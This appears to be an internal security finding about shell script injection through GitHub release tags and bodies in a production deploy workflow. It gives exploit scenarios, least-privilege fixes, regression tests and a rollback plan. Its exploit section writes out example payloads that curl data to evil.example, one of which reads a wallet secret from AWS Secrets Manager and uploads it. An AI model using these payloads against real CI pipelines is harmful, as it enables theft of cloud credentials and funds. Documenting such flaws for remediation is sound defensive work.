---
date: 2026-06-09
tags: [type/incident, domain/security]
status: active
severity: P2
finding_id: FIX-P2-03
---
# FIX-P2-03 — Script injection of untrusted release metadata into shell `run:` blocks in `deploy-prod.yml`

## Summary

`deploy-prod.yml` interpolates attacker-influenceable GitHub release fields (`github.event.release.tag_name` and `github.event.release.body`) directly into `run:` shell scripts. GitHub Actions performs `${{ }}` substitution **textually, before bash parses the script**, so any shell metacharacter (`$(...)`, backticks, `${IFS}`) in a release tag or body executes as a command on the runner. The most dangerous sink (line 74, `VERSION=${{ github.event.release.tag_name }}`) runs in the `build-and-push` job, which holds static AWS deploy credentials (`em-cicd-terraform` policy → `secretsmanager:`, `ecr:`, `ecs:`, `iam:`, `s3:`, `lambda:`), so a successful injection there can read the platform/treasury wallet secrets or push a backdoored image to ECR.

## Severity & Impact (why P2; what funds/data are at risk)

**P2 — real injection antipattern + privileged-actor escalation path, not external fund-theft-now.**

- **Confirmed vulnerable code path.** `${{ }}` is substituted into the script text before bash tokenization, so `$(...)`/backticks in `tag_name`/`body` execute. This is verified at lines 30, 40, and 74 of the current file.
- **Blast radius at line 74 (AWS-creds job).** The `build-and-push` job configures AWS creds (lines 57–62) and runs an ECR login (line 64). Code injected here runs with the CI deploy key. With `secretsmanager:GetSecretValue` it can read the platform wallet private key and treasury secrets (immediate fund-theft primitive), and with `ecr:`/`ecs:` it can push and deploy a backdoored container image. This is why the chained path is severe.
- **Why P2, not P1 (honest scoping of the *gated* nature):**
  1. **The low-barrier vector reaches only `GITHUB_TOKEN`, not AWS.** The supply-chain vector (a contributor's commit subject flowing into the release `body` via `release.yml`) reaches **only line 40**, which lives in the `validate` job (lines 22–45). That job configures **no** AWS credentials — only the default `GITHUB_TOKEN`. The AWS-creds sink (line 74) uses `tag_name`, **not** `body`. So the easy commit-subject payload cannot reach Secrets Manager.
  2. **Line 74 is partially gated.** `build-and-push` declares `needs: validate` (line 50). `validate` fails unless the tag matches `^v[0-9]+\.[0-9]+\.[0-9]+$` (line 31), which forbids every shell metacharacter as a *literal* in the final tag. Reaching line 74 with a live payload therefore requires a **stdout-suppressing command-substitution tag** whose *evaluated* value still passes the regex — e.g. `v1.0.0$(cmd >/dev/null)` — further constrained by git-ref naming rules (no spaces, `:`, `?`, `*`). It is a real but non-trivial bypass.
  3. **Privileged trigger.** `deploy-prod.yml` fires on `release: published`, which requires repo write/release permission; external fork-PR contributors cannot trigger it, and the `body` path needs a maintainer to manually publish a draft release (`release.yml:256` sets `draft: true`) whose body visibly contains the payload.
- **Net residual risk:** (a) a defense-in-depth gap on line 40 (commit-subject → `GITHUB_TOKEN` RCE, no top-level `permissions:` block so the token may be write-scoped); (b) a **privileged escalation** from GitHub write access to AWS Secrets Manager / wallet keys via the regex-bypassing tag on line 74. Both must be fixed.

## Affected code (exact `file:line` references)

`.github/workflows/deploy-prod.yml`:

- **Line 30** (`validate` job — `GITHUB_TOKEN` only) — unquoted interpolation:
  ```yaml
  TAG=${{ github.event.release.tag_name }}
  ```
- **Line 40** (`validate` job — `GITHUB_TOKEN` only) — double-quoted but still injectable via `$()`/backticks:
  ```yaml
  BODY="${{ github.event.release.body }}"
  ```
- **Line 74** (`build-and-push` job — **holds AWS deploy creds**, lines 57–62) — the critical sink:
  ```yaml
  VERSION=${{ github.event.release.tag_name }}
  echo "version=${VERSION#v}" >> $GITHUB_OUTPUT
  ```
  `VERSION` (with `v` stripped) is then used as an **image tag** at lines 84 and 99, so a malformed value also produces a malformed/attacker-controlled ECR tag.
- **No top-level `permissions:` block** (confirmed via grep — there is none in the file). The job inherits the repo default `GITHUB_TOKEN` scope, which may be read/write.

Data source (not a sink — left as defense-in-depth):

- `.github/workflows/release.yml:97` — `COMMITS=$(git log --oneline --pretty=format:"- %s" ...)` builds the changelog from **raw commit subjects**.
- `.github/workflows/release.yml:255` — `body_path: changelog.md` ships that changelog as the release `body`, which later becomes `github.event.release.body` consumed at deploy-prod.yml:40.

> Note: Slack `payload:` blocks (deploy-prod.yml lines 347, 374, 404) also interpolate `github.event.release.tag_name`/`html_url`, but those are JSON payloads passed to a marketplace action, **not** `run:` shell — they are not shell-injection sinks and are out of scope for this fix. They are JSON-injection-adjacent at worst; leave them unless a follow-up hardens them.

## Root cause (the real underlying defect)

GitHub Actions expands `${{ <expression> }}` by **string-substituting the raw value into the YAML `run:` text** before the shell ever sees it. When the value is attacker-influenceable (`release.tag_name`, `release.body`) and it lands inside a `run:` block, any shell metacharacter in the value is interpreted by bash as code, not data. The correct pattern is to bind untrusted values to the step's `env:` map (where they are passed to the shell as environment-variable *values*, never re-tokenized) and reference them as quoted shell variables (`"$TAG"`). The existing format regex at line 31 cannot help line 30, because substitution/execution already happened by the time the regex runs; and it only weakly gates line 74 (bypassable via stdout-suppressed command substitution).

## Exploit scenario (concrete attacker steps)

**Vector A — commit-subject → `GITHUB_TOKEN` RCE (low barrier, no AWS creds):**
1. A contributor lands a commit on `main` with subject:
   `fix: cache key `` `id; curl -d @- https://evil.example` `` (backtick command substitution).
2. A maintainer runs `release.yml`; `prepare-release` builds `changelog.md` from `git log %s` (line 97) and `create-release` publishes it as the release body (line 255, after the draft is manually published).
3. On `release: published`, `deploy-prod.yml` `validate` job runs line 40 `BODY="${{ github.event.release.body }}"`. The embedded `` `...` `` executes on the runner with the (possibly write-scoped) default `GITHUB_TOKEN`.

**Vector B — crafted tag → AWS Secrets Manager / wallet keys (privileged, gated):**
1. An actor with repo write/release rights creates a tag that *evaluates* to a valid semver while carrying a hidden payload, e.g. `v1.0.0$(aws secretsmanager get-secret-value --secret-id em/platform-wallet >/tmp/x; curl -T /tmp/x https://evil.example)` (stdout suppressed so the *result* passing through `${VERSION#v}` still matches the regex).
2. `validate` passes (the evaluated tag is `v1.0.0`). `build-and-push` runs line 74; the injected command executes **with AWS deploy credentials** and exfiltrates the platform/treasury wallet secrets — or pushes a backdoored image to ECR that `deploy` then ships to ECS.

## The Fix (PRECISE, code-level)

This is a CI-only change. **No DB migration, no Terraform, no ECS task-def, no app code, no feature flag.** Three coordinated edits to `deploy-prod.yml` plus one defense-in-depth edit to `release.yml`.

### Change 1 — Add an explicit least-privilege top-level `permissions:` block to `deploy-prod.yml`

Insert immediately after the `concurrency:` block (after line 9, before the `env:` block at line 11). This shrinks the `GITHUB_TOKEN` blast radius for Vector A:

```yaml
concurrency:
  group: production-deploy
  cancel-in-progress: false

# Least-privilege default token. Deploy jobs use static AWS creds (secrets),
# not GITHUB_TOKEN, so read-only is sufficient here.
permissions:
  contents: read

env:
  AWS_REGION: us-east-2
```

### Change 2 — Fix the `validate` job sinks (lines 28–45): bind to `env:`, quote, validate-before-use

Replace the two steps. **Order matters:** validate the tag against the regex *using the env-bound value* before any other use; treat the body strictly as opaque data.

```yaml
      - name: Validate tag format
        env:
          TAG: ${{ github.event.release.tag_name }}
        run: |
          set -euo pipefail
          if [[ ! "$TAG" =~ ^v[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
            echo "Invalid tag format: $TAG"
            echo "Expected format: vX.Y.Z (e.g., v1.0.0)"
            exit 1
          fi
          echo "Tag format valid: $TAG"

      - name: Check release notes
        env:
          BODY: ${{ github.event.release.body }}
        run: |
          set -euo pipefail
          if [ -z "$BODY" ]; then
            echo "Release notes are empty"
            exit 1
          fi
          echo "Release notes present"
```

Key points:
- `TAG`/`BODY` are now **env-var values**, not text spliced into the script. `$(...)`/backticks inside them are inert.
- `"$TAG"` / `"$BODY"` are double-quoted at the point of use.
- The regex still runs, but it is now meaningful (the value can no longer have executed before the check).

### Change 3 — Fix the AWS-creds sink in `build-and-push` (lines 71–75): bind to `env:` AND re-validate before use

This is the **most important** edit — line 74 runs with AWS deploy credentials. Env-binding alone stops shell injection; the explicit re-validation closes the regex-bypass (the `validate`-job regex tests the *evaluated* tag, not the literal, and does not protect this job) and prevents a malformed value from polluting the image tags at lines 84/99.

```yaml
      - name: Extract version
        id: version
        env:
          TAG: ${{ github.event.release.tag_name }}
        run: |
          set -euo pipefail
          # Re-validate INSIDE the AWS-creds job. The validate job's regex tested
          # the evaluated tag and does not protect this sink; env-binding stops
          # shell injection, this check stops a regex-bypassing / malformed tag
          # from becoming a bad image tag (used at lines 84/99).
          if [[ ! "$TAG" =~ ^v[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
            echo "::error::Refusing to build: tag '$TAG' is not strict semver vX.Y.Z"
            exit 1
          fi
          VERSION="${TAG#v}"
          echo "version=${VERSION}" >> "$GITHUB_OUTPUT"
```

After this change, `steps.version.outputs.version` is guaranteed to match `[0-9]+\.[0-9]+\.[0-9]+`, so the downstream uses at lines 84, 89, 99, and 105 are safe.

### Change 4 (defense-in-depth) — Sanitize changelog content in `release.yml`

The authoritative fix is at the deploy-prod.yml sinks; this is secondary, but it removes the easiest payload-delivery channel (raw commit subjects). After `COMMITS` is captured (release.yml line 99/97, in the `Generate changelog` step), strip shell command-substitution metacharacters from commit subjects before they are categorized and written to `changelog.md`. Insert right after the `COMMITS=...` assignment (after line 100), before line 103:

```yaml
          # Defense-in-depth: neutralize shell command-substitution metacharacters
          # in raw commit subjects so they cannot become an injection payload if a
          # downstream consumer ever interpolates release.body into a run: block.
          COMMITS=$(printf '%s' "$COMMITS" | tr -d '`' | sed 's/\$(/(/g')
```

This is intentionally conservative (drops backticks, declaws `$(`) and does not alter legitimate changelog text in practice. It does **not** replace Changes 2/3 — it complements them.

### Backward-compatibility / lockout risk

- **None for legitimate releases.** Real release tags are `vX.Y.Z` and already pass the regex; binding them via `env:` does not change the value. Change 3's re-validation uses the **same** regex the pipeline already enforces in `validate`, so any tag that reaches `build-and-push` today already passes it — no legitimate release is newly rejected.
- **`permissions: contents: read`** is safe: every privileged operation in this workflow uses the **AWS** secrets (`AWS_ACCESS_KEY_ID`/`AWS_SECRET_ACCESS_KEY`) and the `production` environment, not `GITHUB_TOKEN`. The workflow only reads the repo (checkout) and posts to Slack via webhook secret. If a future step needs to write via `GITHUB_TOKEN`, scope it at the **job** level rather than widening the top-level default.
- **Rollout:** single PR; CI-only. No staged flag needed. Recommended (optional) hardening, callable out separately: move the `production` environment gate to also protect `build-and-push` (currently it only gates the `deploy` job at line 119), so injected code in `build-and-push` cannot run before human approval. Tracked as a follow-up, not required to close this finding.

## Test plan (how the execution team proves it's fixed)

This is a workflow-syntax/behavior fix; the practical "tests" are (a) a static lint/grep assertion in CI that the antipattern is gone, and (b) a local shell harness that reproduces the bug and then confirms the env-bound version is inert. No pytest marker applies (these are GitHub Actions YAML files, not Python).

### Test 1 — Static guard (add to repo): assert no untrusted `github.event.*` interpolation inside `run:` of deploy-prod.yml

Add `tests/ci/test_no_run_block_injection.py` (or a shell check in an existing CI lint job). It must **fail on the pre-fix file and pass post-fix**:

```python
"""Regression guard for FIX-P2-03: untrusted github.event.* must not be
interpolated directly into run: shell blocks in deploy workflows."""
import re
import pathlib

WORKFLOWS = [
    ".github/workflows/deploy-prod.yml",
    ".github/workflows/deploy.yml",
]
# Untrusted, attacker-influenceable expression sources.
UNTRUSTED = re.compile(
    r"\$\{\{\s*github\.event\.(release|head_commit|pull_request|issue|comment)\b",
)

def _run_block_lines(text: str):
    """Yield lines that are inside a `run:` block (heuristic: track the
    indentation of the run: key and collect deeper-indented lines)."""
    lines = text.splitlines()
    inside = False
    run_indent = 0
    for ln in lines:
        stripped = ln.strip()
        indent = len(ln) - len(ln.lstrip())
        if re.match(r"run:\s*\|", stripped) or stripped == "run: |":
            inside = True
            run_indent = indent
            continue
        if inside:
            if stripped and indent <= run_indent:
                inside = False
            else:
                yield ln

def test_no_untrusted_interpolation_in_run_blocks():
    offenders = []
    for wf in WORKFLOWS:
        p = pathlib.Path(wf)
        text = p.read_text(encoding="utf-8")
        for ln in _run_block_lines(text):
            if UNTRUSTED.search(ln):
                offenders.append(f"{wf}: {ln.strip()}")
    assert not offenders, (
        "Untrusted github.event.* interpolated into run: block — "
        "bind via env: and quote instead:\n" + "\n".join(offenders)
    )
```

- **Asserts:** zero `${{ github.event.release.* }}` (and other untrusted event contexts) appear inside any `run:` block of the two deploy workflows. On the current file this finds lines 30, 40, 74 and **fails**; after Changes 2 & 3 it **passes** because those values live in `env:` (which the heuristic does not treat as a run-block line).

### Test 2 — Local injection-inertness harness (proves the env pattern neutralizes the payload)

A standalone bash test the executor runs locally to demonstrate the difference, with a sentinel file instead of any real command:

```bash
#!/usr/bin/env bash
# Demonstrates pre-fix injection vs post-fix inertness. No secrets used.
set -uo pipefail
SENTINEL="$(mktemp -d)/pwned"

# --- PRE-FIX simulation: value spliced into script text (vulnerable) ---
PAYLOAD='v1.0.0$(touch '"$SENTINEL"')'
eval "TAG=$PAYLOAD"            # mimics ${{ }} textual substitution into run:
if [ -f "$SENTINEL" ]; then echo "PRE-FIX: INJECTION FIRED (expected)"; rm -f "$SENTINEL"; fi

# --- POST-FIX simulation: value passed as an env var (inert) ---
TAG="$PAYLOAD" bash -c '
  if [[ ! "$TAG" =~ ^v[0-9]+\.[0-9]+\.[0-9]+$ ]]; then echo "POST-FIX: rejected non-semver tag (expected)"; exit 0; fi
  echo "version=${TAG#v}"
'
[ -f "$SENTINEL" ] && { echo "POST-FIX: INJECTION FIRED — FAIL"; exit 1; }
echo "POST-FIX: no injection, tag rejected — PASS"
```

- **Asserts:** the env-bound branch never creates the sentinel and rejects the crafted tag, while the `eval` (pre-fix analogue) does fire it.

### Test 3 — `permissions:` block present

Grep assertion (add to the same CI lint step):
```bash
grep -qE '^permissions:' .github/workflows/deploy-prod.yml || { echo "missing top-level permissions: block"; exit 1; }
```

### Manual / E2E verification

1. Lint the YAML: `actionlint .github/workflows/deploy-prod.yml .github/workflows/release.yml` (or `yamllint`) — must pass with no new errors.
2. Cut a **real** release `vX.Y.Z` (test/staging) and confirm `validate`, `build-and-push`, and `deploy` all succeed and the ECR image is tagged with the clean `X.Y.Z`.
3. **Negative test in a throwaway branch/test repo only** (never on the real production repo): create a draft release with tag `v9.9.9$(touch /tmp/inj)` and confirm the `Extract version` step now **errors** (`Refusing to build: tag ... is not strict semver`) and the run halts before any AWS call. Confirm no command-substitution side effect appears in logs.

## Rollback plan

- This is a single CI-config PR with no runtime/data effects. To roll back, revert the PR (`git revert <sha>`). The previous `deploy-prod.yml`/`release.yml` are restored immediately on the next workflow load; no deployments, migrations, or infra are touched.
- There is no data migration and no ECS/Terraform change, so there is nothing to un-apply on AWS.

## Verification checklist

- [ ] Top-level `permissions: contents: read` added to `deploy-prod.yml` (after `concurrency:`).
- [ ] `Validate tag format` step (line ~28) binds `TAG` via `env:` and uses `"$TAG"`; regex check runs on the env-bound value.
- [ ] `Check release notes` step (line ~38) binds `BODY` via `env:` and uses `"$BODY"`.
- [ ] `Extract version` step (line ~71) binds `TAG` via `env:`, **re-validates** against `^v[0-9]+\.[0-9]+\.[0-9]+$` before stripping `v`, and writes `version` via `"$GITHUB_OUTPUT"`.
- [ ] No `${{ github.event.release.* }}` (or other untrusted `github.event.*`) remains inside any `run:` block of `deploy-prod.yml`.
- [ ] `release.yml` `Generate changelog` step strips backticks / declaws `$(` in `COMMITS` (defense-in-depth).
- [ ] Test 1 (`test_no_run_block_injection.py`) added and passing; confirmed it FAILS when reverted to the old file.
- [ ] Test 2 harness run locally: pre-fix analogue fires, post-fix env-bound branch is inert and rejects the crafted tag.
- [ ] `actionlint`/`yamllint` clean on both workflows.
- [ ] A real `vX.Y.Z` test/staging release runs green end-to-end (validate → build-and-push → deploy) with a clean ECR image tag.
- [ ] No secret values printed anywhere in this change or its tests.
